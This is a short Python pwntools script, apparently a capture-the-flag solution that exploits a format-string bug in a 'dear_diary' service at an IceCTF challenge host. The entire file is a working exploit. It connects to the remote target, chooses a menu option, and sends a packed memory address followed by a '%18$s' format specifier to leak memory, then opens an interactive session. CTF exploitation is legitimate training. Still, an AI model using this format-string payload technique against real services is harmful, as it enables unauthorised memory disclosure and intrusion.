#!/usr/bin/python

from pwn import *

# Uncomment to make remote
p = remote('diary.vuln.icec.tf',6501)

# Uncomment to make local
#p = process('/home/nullp0inter/Downloads/dear_diary')

p.recv()
p.sendline('1')
p.recv()
payload = p32(134520992)+'%18$s'
p.sendline(payload)
p.interactive()
